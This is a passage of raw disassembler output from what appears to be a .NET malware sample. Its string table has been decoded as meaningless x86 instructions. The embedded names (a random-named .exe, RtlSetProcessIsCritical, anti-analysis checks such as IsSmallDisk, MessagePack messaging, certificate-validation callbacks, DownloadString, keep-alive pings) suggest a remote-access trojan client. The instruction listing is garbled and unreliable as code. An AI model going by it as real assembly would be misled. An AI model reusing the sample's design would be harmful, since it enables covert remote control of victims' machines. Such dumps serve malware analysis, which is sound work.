  40817b:	72 69                	jb     0x4081e6
  40817d:	62 75 74             	bound  %esi,0x74(%ebp)
  408180:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408185:	67 65 74 46          	addr16 gs je 0x4081cf
  408189:	72 61                	jb     0x4081ec
  40818b:	6d                   	insl   (%dx),%es:(%edi)
  40818c:	65 77 6f             	gs ja  0x4081fe
  40818f:	72 6b                	jb     0x4081fc
  408191:	41                   	inc    %ecx
  408192:	74 74                	je     0x408208
  408194:	72 69                	jb     0x4081ff
  408196:	62 75 74             	bound  %esi,0x74(%ebp)
  408199:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40819d:	73 65                	jae    0x408204
  40819f:	6d                   	insl   (%dx),%es:(%edi)
  4081a0:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081a4:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081ab:	69 
  4081ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ae:	41                   	inc    %ecx
  4081af:	74 74                	je     0x408225
  4081b1:	72 69                	jb     0x40821c
  4081b3:	62 75 74             	bound  %esi,0x74(%ebp)
  4081b6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081ba:	73 65                	jae    0x408221
  4081bc:	6d                   	insl   (%dx),%es:(%edi)
  4081bd:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c3:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081c9:	74 69                	je     0x408234
  4081cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4081cd:	41                   	inc    %ecx
  4081ce:	74 74                	je     0x408244
  4081d0:	72 69                	jb     0x40823b
  4081d2:	62 75 74             	bound  %esi,0x74(%ebp)
  4081d5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081d9:	73 65                	jae    0x408240
  4081db:	6d                   	insl   (%dx),%es:(%edi)
  4081dc:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081e0:	65 73 63             	gs jae 0x408246
  4081e3:	72 69                	jb     0x40824e
  4081e5:	70 74                	jo     0x40825b
  4081e7:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081ee:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081f5:	65 66 61             	gs popaw
  4081f8:	75 6c                	jne    0x408266
  4081fa:	74 4d                	je     0x408249
  4081fc:	65 6d                	gs insl (%dx),%es:(%edi)
  4081fe:	62 65 72             	bound  %esp,0x72(%ebp)
  408201:	41                   	inc    %ecx
  408202:	74 74                	je     0x408278
  408204:	72 69                	jb     0x40826f
  408206:	62 75 74             	bound  %esi,0x74(%ebp)
  408209:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40820d:	6d                   	insl   (%dx),%es:(%edi)
  40820e:	70 69                	jo     0x408279
  408210:	6c                   	insb   (%dx),%es:(%edi)
  408211:	61                   	popa
  408212:	74 69                	je     0x40827d
  408214:	6f                   	outsl  %ds:(%esi),(%dx)
  408215:	6e                   	outsb  %ds:(%esi),(%dx)
  408216:	52                   	push   %edx
  408217:	65 6c                	gs insb (%dx),%es:(%edi)
  408219:	61                   	popa
  40821a:	78 61                	js     0x40827d
  40821c:	74 69                	je     0x408287
  40821e:	6f                   	outsl  %ds:(%esi),(%dx)
  40821f:	6e                   	outsb  %ds:(%esi),(%dx)
  408220:	73 41                	jae    0x408263
  408222:	74 74                	je     0x408298
  408224:	72 69                	jb     0x40828f
  408226:	62 75 74             	bound  %esi,0x74(%ebp)
  408229:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40822d:	73 65                	jae    0x408294
  40822f:	6d                   	insl   (%dx),%es:(%edi)
  408230:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408234:	72 6f                	jb     0x4082a5
  408236:	64 75 63             	fs jne 0x40829c
  408239:	74 41                	je     0x40827c
  40823b:	74 74                	je     0x4082b1
  40823d:	72 69                	jb     0x4082a8
  40823f:	62 75 74             	bound  %esi,0x74(%ebp)
  408242:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408246:	73 65                	jae    0x4082ad
  408248:	6d                   	insl   (%dx),%es:(%edi)
  408249:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40824d:	6f                   	outsl  %ds:(%esi),(%dx)
  40824e:	70 79                	jo     0x4082c9
  408250:	72 69                	jb     0x4082bb
  408252:	67 68 74 41 74 74    	addr16 push $0x74744174
  408258:	72 69                	jb     0x4082c3
  40825a:	62 75 74             	bound  %esi,0x74(%ebp)
  40825d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408261:	73 65                	jae    0x4082c8
  408263:	6d                   	insl   (%dx),%es:(%edi)
  408264:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408268:	6f                   	outsl  %ds:(%esi),(%dx)
  408269:	6d                   	insl   (%dx),%es:(%edi)
  40826a:	70 61                	jo     0x4082cd
  40826c:	6e                   	outsb  %ds:(%esi),(%dx)
  40826d:	79 41                	jns    0x4082b0
  40826f:	74 74                	je     0x4082e5
  408271:	72 69                	jb     0x4082dc
  408273:	62 75 74             	bound  %esi,0x74(%ebp)
  408276:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40827a:	6e                   	outsb  %ds:(%esi),(%dx)
  40827b:	74 69                	je     0x4082e6
  40827d:	6d                   	insl   (%dx),%es:(%edi)
  40827e:	65 43                	gs inc %ebx
  408280:	6f                   	outsl  %ds:(%esi),(%dx)
  408281:	6d                   	insl   (%dx),%es:(%edi)
  408282:	70 61                	jo     0x4082e5
  408284:	74 69                	je     0x4082ef
  408286:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408289:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408290:	69 
  408291:	62 75 74             	bound  %esi,0x74(%ebp)
  408294:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408298:	74 5f                	je     0x4082f9
  40829a:	55                   	push   %ebp
  40829b:	73 65                	jae    0x408302
  40829d:	53                   	push   %ebx
  40829e:	68 65 6c 6c 45       	push   $0x456c6c65
  4082a3:	78 65                	js     0x40830a
  4082a5:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082a8:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082ac:	61                   	popa
  4082ad:	64 42                	fs inc %edx
  4082af:	79 74                	jns    0x408325
  4082b1:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082b5:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082bc:	00 
  4082bd:	44                   	inc    %esp
  4082be:	65 6c                	gs insb (%dx),%es:(%edi)
  4082c0:	65 74 65             	gs je  0x408328
  4082c3:	56                   	push   %esi
  4082c4:	61                   	popa
  4082c5:	6c                   	insb   (%dx),%es:(%edi)
  4082c6:	75 65                	jne    0x40832d
  4082c8:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4082cc:	65 72 56             	gs jb  0x408325
  4082cf:	61                   	popa
  4082d0:	6c                   	insb   (%dx),%es:(%edi)
  4082d1:	75 65                	jne    0x408338
  4082d3:	00 47 65             	add    %al,0x65(%edi)
  4082d6:	74 56                	je     0x40832e
  4082d8:	61                   	popa
  4082d9:	6c                   	insb   (%dx),%es:(%edi)
  4082da:	75 65                	jne    0x408341
  4082dc:	00 53 65             	add    %dl,0x65(%ebx)
  4082df:	74 56                	je     0x408337
  4082e1:	61                   	popa
  4082e2:	6c                   	insb   (%dx),%es:(%edi)
  4082e3:	75 65                	jne    0x40834a
  4082e5:	00 76 61             	add    %dh,0x61(%esi)
  4082e8:	6c                   	insb   (%dx),%es:(%edi)
  4082e9:	75 65                	jne    0x408350
  4082eb:	00 67 65             	add    %ah,0x65(%edi)
  4082ee:	74 5f                	je     0x40834f
  4082f0:	4b                   	dec    %ebx
  4082f1:	65 65 70 41          	gs gs jo 0x408336
  4082f5:	6c                   	insb   (%dx),%es:(%edi)
  4082f6:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082fd:	5f                   	pop    %edi
  4082fe:	4b                   	dec    %ebx
  4082ff:	65 65 70 41          	gs gs jo 0x408344
  408303:	6c                   	insb   (%dx),%es:(%edi)
  408304:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  40830b:	6f                   	outsl  %ds:(%esi),(%dx)
  40830c:	76 65                	jbe    0x408373
  40830e:	00 6c 36 78          	add    %ch,0x78(%esi,%esi,1)
  408312:	75 79                	jne    0x40838d
  408314:	35 6f 38 2e 65       	xor    $0x652e386f,%eax
  408319:	78 65                	js     0x408380
  40831b:	00 73 65             	add    %dh,0x65(%ebx)
  40831e:	74 5f                	je     0x40837f
  408320:	42                   	inc    %edx
  408321:	6c                   	insb   (%dx),%es:(%edi)
  408322:	6f                   	outsl  %ds:(%esi),(%dx)
  408323:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408326:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40832d:	5f                   	pop    %edi
  40832e:	54                   	push   %esp
  40832f:	6f                   	outsl  %ds:(%esi),(%dx)
  408330:	74 61                	je     0x408393
  408332:	6c                   	insb   (%dx),%es:(%edi)
  408333:	53                   	push   %ebx
  408334:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40833b:	5f                   	pop    %edi
  40833c:	48                   	dec    %eax
  40833d:	65 61                	gs popa
  40833f:	64 65 72 53          	fs gs jb 0x408396
  408343:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40834a:	5f                   	pop    %edi
  40834b:	48                   	dec    %eax
  40834c:	65 61                	gs popa
  40834e:	64 65 72 53          	fs gs jb 0x4083a5
  408352:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408359:	5f                   	pop    %edi
  40835a:	53                   	push   %ebx
  40835b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40835d:	64 42                	fs inc %edx
  40835f:	75 66                	jne    0x4083c7
  408361:	66 65 72 53          	data16 gs jb 0x4083b8
  408365:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40836c:	5f                   	pop    %edi
  40836d:	52                   	push   %edx
  40836e:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408372:	76 65                	jbe    0x4083d9
  408374:	42                   	inc    %edx
  408375:	75 66                	jne    0x4083dd
  408377:	66 65 72 53          	data16 gs jb 0x4083ce
  40837b:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408382:	5f                   	pop    %edi
  408383:	4b                   	dec    %ebx
  408384:	65 79 53             	gs jns 0x4083da
  408387:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  40838e:	65 78 4f             	gs js  0x4083e0
  408391:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  408395:	72 46                	jb     0x4083dd
  408397:	6c                   	insb   (%dx),%es:(%edi)
  408398:	61                   	popa
  408399:	67 00 43 72          	add    %al,0x72(%bp,%di)
  40839d:	79 70                	jns    0x40840f
  40839f:	74 6f                	je     0x408410
  4083a1:	43                   	inc    %ebx
  4083a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a4:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083aa:	74 5f                	je     0x40840b
  4083ac:	50                   	push   %eax
  4083ad:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083b4:	5f                   	pop    %edi
  4083b5:	50                   	push   %eax
  4083b6:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083bd:	74 65                	je     0x408424
  4083bf:	6d                   	insl   (%dx),%es:(%edi)
  4083c0:	2e 54                	cs push %esp
  4083c2:	68 72 65 61 64       	push   $0x64616572
  4083c7:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083ce:	5f                   	pop    %edi
  4083cf:	50                   	push   %eax
  4083d0:	61                   	popa
  4083d1:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083d8:	64 64 
  4083da:	5f                   	pop    %edi
  4083db:	53                   	push   %ebx
  4083dc:	65 73 73             	gs jae 0x408452
  4083df:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e7:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083eb:	73 74                	jae    0x408461
  4083ed:	65 6d                	gs insl (%dx),%es:(%edi)
  4083ef:	45                   	inc    %ebp
  4083f0:	76 65                	jbe    0x408457
  4083f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f3:	74 73                	je     0x408468
  4083f5:	5f                   	pop    %edi
  4083f6:	53                   	push   %ebx
  4083f7:	65 73 73             	gs jae 0x40846d
  4083fa:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408401:	6e                   	outsb  %ds:(%esi),(%dx)
  408402:	67 00 55 54          	add    %dl,0x54(%di)
  408406:	46                   	inc    %esi
  408407:	38 45 6e             	cmp    %al,0x6e(%ebp)
  40840a:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40840d:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408414:	74 65                	je     0x40847b
  408416:	6d                   	insl   (%dx),%es:(%edi)
  408417:	2e 44                	cs inc %esp
  408419:	72 61                	jb     0x40847c
  40841b:	77 69                	ja     0x408486
  40841d:	6e                   	outsb  %ds:(%esi),(%dx)
  40841e:	67 2e 49             	addr16 cs dec %ecx
  408421:	6d                   	insl   (%dx),%es:(%edi)
  408422:	61                   	popa
  408423:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  40842a:	73 
  40842b:	74 65                	je     0x408492
  40842d:	6d                   	insl   (%dx),%es:(%edi)
  40842e:	2e 52                	cs push %edx
  408430:	75 6e                	jne    0x4084a0
  408432:	74 69                	je     0x40849d
  408434:	6d                   	insl   (%dx),%es:(%edi)
  408435:	65 2e 56             	gs cs push %esi
  408438:	65 72 73             	gs jb  0x4084ae
  40843b:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408442:	46                   	inc    %esi
  408443:	72 6f                	jb     0x4084b4
  408445:	6d                   	insl   (%dx),%es:(%edi)
  408446:	42                   	inc    %edx
  408447:	61                   	popa
  408448:	73 65                	jae    0x4084af
  40844a:	36 34 53             	ss xor $0x53,%al
  40844d:	74 72                	je     0x4084c1
  40844f:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408456:	61                   	popa
  408457:	73 65                	jae    0x4084be
  408459:	36 34 53             	ss xor $0x53,%al
  40845c:	74 72                	je     0x4084d0
  40845e:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  408465:	64 53                	fs push %ebx
  408467:	74 72                	je     0x4084db
  408469:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408470:	6e                   	outsb  %ds:(%esi),(%dx)
  408471:	6c                   	insb   (%dx),%es:(%edi)
  408472:	6f                   	outsl  %ds:(%esi),(%dx)
  408473:	61                   	popa
  408474:	64 53                	fs push %ebx
  408476:	74 72                	je     0x4084ea
  408478:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  40847f:	74 65                	je     0x4084e6
  408481:	53                   	push   %ebx
  408482:	74 72                	je     0x4084f6
  408484:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  40848b:	74 72                	je     0x4084ff
  40848d:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408494:	5f                   	pop    %edi
  408495:	41                   	inc    %ecx
  408496:	73 53                	jae    0x4084eb
  408498:	74 72                	je     0x40850c
  40849a:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4084a1:	5f                   	pop    %edi
  4084a2:	41                   	inc    %ecx
  4084a3:	73 53                	jae    0x4084f8
  4084a5:	74 72                	je     0x408519
  4084a7:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084ae:	65 73 41             	gs jae 0x4084f2
  4084b1:	73 53                	jae    0x408506
  4084b3:	74 72                	je     0x408527
  4084b5:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084bc:	41                   	inc    %ecx
  4084bd:	73 53                	jae    0x408512
  4084bf:	74 72                	je     0x408533
  4084c1:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084c8:	41                   	inc    %ecx
  4084c9:	73 53                	jae    0x40851e
  4084cb:	74 72                	je     0x40853f
  4084cd:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084d4:	53                   	push   %ebx
  4084d5:	74 72                	je     0x408549
  4084d7:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084de:	65 73 41             	gs jae 0x408522
  4084e1:	73 48                	jae    0x40852b
  4084e3:	65 78 53             	gs js  0x408539
  4084e6:	74 72                	je     0x40855a
  4084e8:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084ef:	73 74                	jae    0x408565
  4084f1:	72 69                	jb     0x40855c
  4084f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f4:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084f8:	73 74                	jae    0x40856e
  4084fa:	65 6d                	gs insl (%dx),%es:(%edi)
  4084fc:	2e 44                	cs inc %esp
  4084fe:	72 61                	jb     0x408561
  408500:	77 69                	ja     0x40856b
  408502:	6e                   	outsb  %ds:(%esi),(%dx)
  408503:	67 00 67 65          	add    %ah,0x65(%bx)
  408507:	74 5f                	je     0x408568
  408509:	41                   	inc    %ecx
  40850a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40850e:	61                   	popa
  40850f:	74 65                	je     0x408576
  408511:	50                   	push   %eax
  408512:	6f                   	outsl  %ds:(%esi),(%dx)
  408513:	6e                   	outsb  %ds:(%esi),(%dx)
  408514:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408518:	74 5f                	je     0x408579
  40851a:	41                   	inc    %ecx
  40851b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40851f:	61                   	popa
  408520:	74 65                	je     0x408587
  408522:	50                   	push   %eax
  408523:	6f                   	outsl  %ds:(%esi),(%dx)
  408524:	6e                   	outsb  %ds:(%esi),(%dx)
  408525:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408529:	74 5f                	je     0x40858a
  40852b:	45                   	inc    %ebp
  40852c:	72 72                	jb     0x4085a0
  40852e:	6f                   	outsl  %ds:(%esi),(%dx)
  40852f:	72 44                	jb     0x408575
  408531:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408538:	73 67                	jae    0x4085a1
  40853a:	00 43 6f             	add    %al,0x6f(%ebx)
  40853d:	6d                   	insl   (%dx),%es:(%edi)
  40853e:	70 75                	jo     0x4085b5
  408540:	74 65                	je     0x4085a7
  408542:	48                   	dec    %eax
  408543:	61                   	popa
  408544:	73 68                	jae    0x4085ae
  408546:	00 73 74             	add    %dh,0x74(%ebx)
  408549:	72 54                	jb     0x40859f
  40854b:	6f                   	outsl  %ds:(%esi),(%dx)
  40854c:	48                   	dec    %eax
  40854d:	61                   	popa
  40854e:	73 68                	jae    0x4085b8
  408550:	00 47 65             	add    %al,0x65(%edi)
  408553:	74 48                	je     0x40859d
  408555:	61                   	popa
  408556:	73 68                	jae    0x4085c0
  408558:	00 56 65             	add    %dl,0x65(%esi)
  40855b:	72 69                	jb     0x4085c6
  40855d:	66 79 48             	data16 jns 0x4085a8
  408560:	61                   	popa
  408561:	73 68                	jae    0x4085cb
  408563:	00 46 6c             	add    %al,0x6c(%esi)
  408566:	75 73                	jne    0x4085db
  408568:	68 00 67 65 74       	push   $0x74656700
  40856d:	5f                   	pop    %edi
  40856e:	45                   	inc    %ebp
  40856f:	78 65                	js     0x4085d6
  408571:	63 75 74             	arpl   %esi,0x74(%ebp)
  408574:	61                   	popa
  408575:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408579:	61                   	popa
  40857a:	74 68                	je     0x4085e4
  40857c:	00 47 65             	add    %al,0x65(%edi)
  40857f:	74 54                	je     0x4085d5
  408581:	65 6d                	gs insl (%dx),%es:(%edi)
  408583:	70 50                	jo     0x4085d5
  408585:	61                   	popa
  408586:	74 68                	je     0x4085f0
  408588:	00 70 61             	add    %dh,0x61(%eax)
  40858b:	74 68                	je     0x4085f5
  40858d:	00 48 6d             	add    %cl,0x6d(%eax)
  408590:	61                   	popa
  408591:	63 53 68             	arpl   %edx,0x68(%ebx)
  408594:	61                   	popa
  408595:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  40859b:	67 74 68             	addr16 je 0x408606
  40859e:	00 67 65             	add    %ah,0x65(%edi)
  4085a1:	74 5f                	je     0x408602
  4085a3:	4c                   	dec    %esp
  4085a4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a6:	67 74 68             	addr16 je 0x408611
  4085a9:	00 49 76             	add    %cl,0x76(%ecx)
  4085ac:	4c                   	dec    %esp
  4085ad:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085af:	67 74 68             	addr16 je 0x40861a
  4085b2:	00 41 75             	add    %al,0x75(%ecx)
  4085b5:	74 68                	je     0x40861f
  4085b7:	4b                   	dec    %ebx
  4085b8:	65 79 4c             	gs jns 0x408607
  4085bb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085bd:	67 74 68             	addr16 je 0x408628
  4085c0:	00 55 72             	add    %dl,0x72(%ebp)
  4085c3:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085c9:	00 6d 73             	add    %ch,0x73(%ebp)
  4085cc:	67 70 61             	addr16 jo 0x408630
  4085cf:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085d2:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085d5:	6c                   	insb   (%dx),%es:(%edi)
  4085d6:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4085de:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085e1:	4d                   	dec    %ebp
  4085e2:	65 73 73             	gs jae 0x408658
  4085e5:	61                   	popa
  4085e6:	67 65 50             	addr16 gs push %eax
  4085e9:	61                   	popa
  4085ea:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085ed:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085f4:	61                   	popa
  4085f5:	67 65 50             	addr16 gs push %eax
  4085f8:	61                   	popa
  4085f9:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085fc:	4d                   	dec    %ebp
  4085fd:	73 67                	jae    0x408666
  4085ff:	50                   	push   %eax
  408600:	61                   	popa
  408601:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408604:	41                   	inc    %ecx
  408605:	73 79                	jae    0x408680
  408607:	6e                   	outsb  %ds:(%esi),(%dx)
  408608:	63 43 61             	arpl   %eax,0x61(%ebx)
  40860b:	6c                   	insb   (%dx),%es:(%edi)
  40860c:	6c                   	insb   (%dx),%es:(%edi)
  40860d:	62 61 63             	bound  %esp,0x63(%ecx)
  408610:	6b 00 52             	imul   $0x52,(%eax),%eax
  408613:	65 6d                	gs insl (%dx),%es:(%edi)
  408615:	6f                   	outsl  %ds:(%esi),(%dx)
  408616:	74 65                	je     0x40867d
  408618:	43                   	inc    %ebx
  408619:	65 72 74             	gs jb  0x408690
  40861c:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408623:	56                   	push   %esi
  408624:	61                   	popa
  408625:	6c                   	insb   (%dx),%es:(%edi)
  408626:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40862d:	43 
  40862e:	61                   	popa
  40862f:	6c                   	insb   (%dx),%es:(%edi)
  408630:	6c                   	insb   (%dx),%es:(%edi)
  408631:	62 61 63             	bound  %esp,0x63(%ecx)
  408634:	6b 00 54             	imul   $0x54,(%eax),%eax
  408637:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  40863e:	6c                   	insb   (%dx),%es:(%edi)
  40863f:	62 61 63             	bound  %esp,0x63(%ecx)
  408642:	6b 00 75             	imul   $0x75,(%eax),%eax
  408645:	6e                   	outsb  %ds:(%esi),(%dx)
  408646:	70 61                	jo     0x4086a9
  408648:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  40864b:	6d                   	insl   (%dx),%es:(%edi)
  40864c:	73 67                	jae    0x4086b5
  40864e:	70 61                	jo     0x4086b1
  408650:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408653:	52                   	push   %edx
  408654:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40865b:	4b 65 
  40865d:	79 50                	jns    0x4086af
  40865f:	65 72 6d             	gs jb  0x4086cf
  408662:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408669:	68 65 63 6b 00       	push   $0x6b6365
  40866e:	46                   	inc    %esi
  40866f:	6c                   	insb   (%dx),%es:(%edi)
  408670:	75 73                	jne    0x4086e5
  408672:	68 46 69 6e 61       	push   $0x616e6946
  408677:	6c                   	insb   (%dx),%es:(%edi)
  408678:	42                   	inc    %edx
  408679:	6c                   	insb   (%dx),%es:(%edi)
  40867a:	6f                   	outsl  %ds:(%esi),(%dx)
  40867b:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40867e:	49                   	dec    %ecx
  40867f:	73 53                	jae    0x4086d4
  408681:	6d                   	insl   (%dx),%es:(%edi)
  408682:	61                   	popa
  408683:	6c                   	insb   (%dx),%es:(%edi)
  408684:	6c                   	insb   (%dx),%es:(%edi)
  408685:	44                   	inc    %esp
  408686:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  40868d:	6c                   	insb   (%dx),%es:(%edi)
  40868e:	00 66 56             	add    %ah,0x56(%esi)
  408691:	61                   	popa
  408692:	6c                   	insb   (%dx),%es:(%edi)
  408693:	00 69 56             	add    %ch,0x56(%ecx)
  408696:	61                   	popa
  408697:	6c                   	insb   (%dx),%es:(%edi)
  408698:	00 73 74             	add    %dh,0x74(%ebx)
  40869b:	72 56                	jb     0x4086f3
  40869d:	61                   	popa
  40869e:	6c                   	insb   (%dx),%es:(%edi)
  40869f:	00 52 74             	add    %dl,0x74(%edx)
  4086a2:	6c                   	insb   (%dx),%es:(%edi)
  4086a3:	53                   	push   %ebx
  4086a4:	65 74 50             	gs je  0x4086f7
  4086a7:	72 6f                	jb     0x408718
  4086a9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086ac:	73 49                	jae    0x4086f7
  4086ae:	73 43                	jae    0x4086f3
  4086b0:	72 69                	jb     0x40871b
  4086b2:	74 69                	je     0x40871d
  4086b4:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086b7:	00 50 72             	add    %dl,0x72(%eax)
  4086ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4086bb:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086be:	73 43                	jae    0x408703
  4086c0:	72 69                	jb     0x40872b
  4086c2:	74 69                	je     0x40872d
  4086c4:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086c7:	00 4e 65             	add    %cl,0x65(%esi)
  4086ca:	74 77                	je     0x408743
  4086cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4086cd:	72 6b                	jb     0x40873a
  4086cf:	43                   	inc    %ebx
  4086d0:	72 65                	jb     0x408737
  4086d2:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086d5:	74 69                	je     0x408740
  4086d7:	61                   	popa
  4086d8:	6c                   	insb   (%dx),%es:(%edi)
  4086d9:	00 53 79             	add    %dl,0x79(%ebx)
  4086dc:	73 74                	jae    0x408752
  4086de:	65 6d                	gs insl (%dx),%es:(%edi)
  4086e0:	2e 53                	cs push %ebx
  4086e2:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086e6:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086ed:	6e 
  4086ee:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086f1:	61                   	popa
  4086f2:	6c                   	insb   (%dx),%es:(%edi)
  4086f3:	00 57 69             	add    %dl,0x69(%edi)
  4086f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f7:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086f9:	77 73                	ja     0x40876e
  4086fb:	50                   	push   %eax
  4086fc:	72 69                	jb     0x408767
  4086fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4086ff:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408702:	61                   	popa
